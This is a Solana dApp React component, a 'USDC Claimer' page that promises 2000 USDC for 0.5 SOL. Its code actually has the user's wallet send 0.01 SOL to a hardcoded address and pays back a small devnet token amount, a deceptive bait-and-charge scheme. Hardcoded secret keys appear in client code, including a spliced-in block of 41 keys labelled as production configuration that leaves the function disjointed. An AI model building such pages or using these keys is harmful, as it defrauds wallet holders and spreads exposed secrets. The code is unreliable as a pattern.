/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4Hf92zLimLeCqG9KrPpRUiZXfztv3HNTZvrqGQc4oVWfHSBuRQiyBywkVqso8x1iEURBomKQfJMHf7sEbMgYUtrQ"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4dV3PJDG94iXsfqYV15YksmpMt1sLBdTvywW1KJbZuKV33hFM69PjAnU4AGuiDccpqTiY3ofEY4QeyZ61dzoaf41",
  "key1": "36MRprugv4oGP5NWWfnPDqSCiPVW3RCp4jS4DZe2fbf5kYaNhDdRD6XWdCwkwAQsoc1yYF8DmNAvC4Us2bcnNSyp",
  "key2": "62pyVhcYFgKMurTnvRM5n1dTexmdCyumNUqfvwDvW5tpBF35QdGpFPoeJfcacenwdCxytJUoqqb3Pf3o7RPSCzGY",
  "key3": "3ZZM27QgReYC2DJrhFBFxUbQdYLj6Nhspvb4nju1xoUCvz9eEMMbsLZPeykh1qDBGSj2sTo3N1RFGpySD7h3Gu78",
  "key4": "31wuJuYDCmduiUb4zDia8CiwjJx1oAKHmy9TYVN4kNExTRQZVVzcomJF7HYtPtEra72SzMLUaZeE5JhTBVTsJePK",
  "key5": "4mGLwWjnNHwTVQ8F4hQqbXejG86nZmyefq65AtWP3F7L8Ssgh22cYTe1FSko98K59oNDrGcMFXPTKJLdgo9E6Nq",
  "key6": "uzM7JmWgnA4WWr9PyxKeaib9LrLRtyW2pszjSvuUDd3LSZUWCehZ5G6ch2Jhwa2XsB4x8aV9JHJGUXKjtQ5zqCQ",
  "key7": "5fkFTdGtVV6BYcf52tHNCK55XHroa8T2jz7fH8rBAmLuWuDkpcu3vnqcFsc9T5rqHcJ8UotPUSDw5KdwN2BEGHrD",
  "key8": "5WpYw2N3UXJGZbWLtwqGdAo3HZ44kLixx6va9M6gPWJ2HMJwoaRadHcvBEPGFpktQBE8tRMTXr8XoGe8FqptnJg6",
  "key9": "4JFtV2KFJoVCgwnvmYcGTihv7oHnE24JsinXBBjctTYryLGVsqC8b6wAY38yqoPfQ8AAKXc38rJD2TQ6BJznR7SN",
  "key10": "4bZyEc76XXPQviV1tBaNuWX4KaSGQVG6UQijwmyGF27ZMRB2JKdEY2ASXW5gEnNye2MNtTTFe5t1a32Pv3knnsgz",
  "key11": "37SQkPE6Cgjvq1eGDNtTE7QwFb92m7hYPeXgYm65BZ8C6HxnaKfEQ4aNb6yw87ktzZqUkTBKrhjtMbeHRWKKia5Q",
  "key12": "zscTZt76JJrCoSkzXqhDM5xPFNGbohDeePkS17uX9vxQBW3EGSjgg52ByT5dYtuhREMYrwhjGkk3bV78WTpKpRt",
  "key13": "kKNzJzcsZzHG7aCyKCcwwpNvYfMvKVKYnVZYuZ69zzA6dEazvBP341KAcEWoDbkHZmVQvcDcNvULM4hTVJqWtii",
  "key14": "4ZRHYWA32toJje16prjvXzN73NnJG63pEEo92qkgtcFYe3LZWNFd9iyaYRWtCp9Rhcru1pRVdPJeXQepcVXbFwqZ",
  "key15": "5PC9F8TixewKHewKyRi31QmVtvs6QtJtcCputqspb5WQDGacvuCAvzpz6TU7b3axhkobBDawPmaDFQSbAccEqE7R",
  "key16": "5Zh8GwjyPykkizxibvu4qByoFhyfP5xAsAsDGorQ9tQanJxYCEZ6F1zyt9SGjage4Q1txdYxV9tnUEb6C5Qz7G85",
  "key17": "5sXotLBKhvMQkXTDjba7zZQ1eCjW4Vpiaxw1gi8bYeeHhJXDbdatmjcrdKRKjDXdAxPENCBaQotwUSDWYbxjCgU4",
  "key18": "5yzp14vwuMtFq4Zor8f7sCUD22Nve72GVLPxpP6QzmPYrTuqbszH5EzzCgXps8mnubBKJ3xQVWJprF7yjyg3NPbS",
  "key19": "3UcJiZQCJfMLm2aijibnSPZG9NmZ1XD9eg7Vhf6gNxsx6oXG12djGbP5UXnPfxGCDjFuLf7Tb2Vf3FPDkfiMSmFc",
  "key20": "37jWJqE9ZnKVTrAiBUbFa9sw5hg9tBJhvxQTUwi1BEM7HZJcKiCAZXzTRtn3tejwBwvzB9UFTyeTafFrZ9qdjwQR",
  "key21": "2RxCvPRADeX6NfngEamfNgSVzgAdLwLsUNCru7cRGZV8QWJoJ9BoFXrD9kkT7nmYYKGMYkZkGf1mjfmsLbm5Z8N9",
  "key22": "45n32qqkyTnMBBi8NZ5ouxqQBSfLg8AoUJLmS2GWbUM3bbCSY5SnMszRf7Jd6pXhmymgF81Uf349kaVkgJgAHAwZ",
  "key23": "2tsmCJ9BtF7KkeYfnA6CR8C3oUTFSeasbedvBMBYVtbxGEQn6FkL1HsRhfMLXnDGq8kGHLazoujAj815UzTFmE6r",
  "key24": "3X5HGrm1dKsUvY7nuVsGBoqjxfDMpnsJkvUmK7q2jGS4cetz7WRc4vAFMmS6tN4sLcDdrhs24mgzquooB4hK7bgg",
  "key25": "3fjop3v8AMMWN2dvdAiXADeyANxqWQURyM5gzBJaMpYLDUxZKiatyFPPYtwkRJyeZmcgiCECU1scYMBa4HwT3deJ",
  "key26": "4eLittt7NRyzHZECZD2TRQJsJpfkq1biDzBP6HYZFpd77xiThDYMz5szX6GeiAS68WFCGpj3NqGHQ7Lw1jfJZsDk",
  "key27": "2hz6bF62DUXKGAiRT8tuM8WecrHtL382WBXJHAktvTuCdAw2yECjFwLUYRX4TMpJmcHUQEgBj1mrPRyJ7enipV6",
  "key28": "6jvMTf9dpVNJqd9pfvYhXNu77c5G2ncqfLnjFxxhrfsjQfYxho1EPoSPkwG2AHDKJ5ZjrmjDtVPQKVP4waecNLH",
  "key29": "rLN6NKKb7uHfMzXixjh51Q9XJgsD4HG6MsHMRPxfrSiB8XipLFzEwVxGFiLM1BE9Vket4ReTPPzPmgUN3ZmL8DP",
  "key30": "cbeEX3c35AeMKiSPEfZ6S8AFrTiZJJhy48DtNoDC1de9tGw8zHoF8gES3ckaMWXpZDhChXMcN7tSGdJemNkFRFJ",
  "key31": "2GJt3YtQhJxrwnzbCFuPCbGxXRY1fKhdTshUvDyB17H6UmsVJKBjaqBFcSQSK9M42BiqaQq1vVQhYiZwSwv4Zxvt",
  "key32": "5xiSuDtGhFob8PiSwbbhLdCzCFypVYR8RCBMcK1dAdeQcGXJ7rJ1itvA76AibYm5pHMYd2n7ydfx99KpCtcVDebq",
  "key33": "4YTAMSEPXtuEq2c8B3Umma9fa77r3khXen9UsyumGpMJ3ucST4amHfreqCh53F1Mppt8i8QbD3BUuX8KXVPfJt6T",
  "key34": "58UcNxfHamNo6SiT7WhPmE99WyxVvNdeoAwaf1Lu6K381qCdSPftPV5pXiEmFMnxSsx8JbZbLcJGSLESkZH2e3BN",
  "key35": "4Ci9Xgghamz2a5uLgG23sDcEfL6SU3EVZ7QFwn4npbHr6GVm3KMvZmpjPEgEPrSHffR7WwBe7A661vjPyhSLQWiR",
  "key36": "5wQ9Kvovtdw74JsJxRmKyrRhn41m3np6xkyQ5dU3etPZZGyfYXzNWnUJPBQh9PrPggvLT33w3jT3fEkxycQZzwWm",
  "key37": "2Cg5gxq49wL9c5JEEFj2kjRfGSwgmX7om161tqbqB7UTKdkSEMGKQaLB4roFema8AAc34WTzdQwX77yoCUvmMV9y",
  "key38": "5qRzC36kQg17sGtuPSUzzGPknL3ENi2grAA3ARrKnWyHj8xUwuTi1NR2UhfyYVVfbUDTdanJy2szNWkkZHF54R2k",
  "key39": "4jmtJi3PDULmyZ6tTvyyYokgY5Tk1bX9GGoX9ym8YDvDKgdUvKKn9qmgzuHJAJg5WjU4r39Fz33MfWfVpqpnYV6Z",
  "key40": "VfHvdBGWG7hLaiky6uduvygDHfmw7Z6CNh62yiEzgFWT2ccohuR7u2pn3fewSHr99jFMAyZWCeBDAa21o9wp1v3"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
